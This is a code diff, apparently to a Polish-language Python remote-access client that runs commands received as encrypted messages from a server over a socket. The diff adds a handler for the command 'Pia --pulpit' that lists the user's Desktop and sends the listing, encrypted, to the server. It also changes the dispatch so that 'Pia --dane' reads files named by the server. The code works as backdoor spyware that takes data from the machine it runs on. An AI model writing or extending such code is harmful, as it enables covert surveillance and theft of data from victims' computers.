@@ -67,6 +67,23 @@ def Pia_inna(server_socket):
         pass
 
 
+def odczytaj_zawartosc_pulpitu(server_socket):
+    try:
+        desktop_path = os.path.join(os.path.join(
+            os.environ['USERPROFILE']), 'Desktop')
+        desktop_contents = os.listdir(desktop_path)
+        zawartosc_pulpitu = '\n'.join(desktop_contents)
+        formatted_response = "Zawartość pulpitu:\n" + zawartosc_pulpitu
+        # Zamiast używać tabulatorów, użyjmy kilku znaków spacji
+        formatted_response = formatted_response.replace('\t', '    ')
+        server_socket.sendall(szyfrowanie(formatted_response).encode())
+        print('Zawartość pulpitu została wysłana na serwer.')
+    except Exception as e:
+        error_message = f'Wystąpił błąd podczas odczytu zawartości pulpitu: {e}'
+        server_socket.sendall(szyfrowanie(error_message).encode())
+        print(error_message)
+
+
 def tworzenie_ikonki():
     # Inicjalizacja COM
     pythoncom.CoInitialize()
@@ -245,7 +262,11 @@ def receive_messages(server_socket):
                 sys.exit()  # Wyjdź z programu
             elif odszyfrowywanie(data.decode()) == "Pia --clear":
                 os.system('cls')
-            elif decrypted_data.startswith("Pia --dane_pliku"):
+            decrypted_data = odszyfrowywanie(data.decode())
+            if decrypted_data == "Pia --pulpit":
+                odczytaj_zawartosc_pulpitu(server_socket)
+
+            elif decrypted_data.startswith("Pia --dane"):
                 # Odczytaj nazwę pliku, którą serwer przekazuje w komunikacie
                 command = decrypted_data.strip()
                 command_parts = command.split('("')
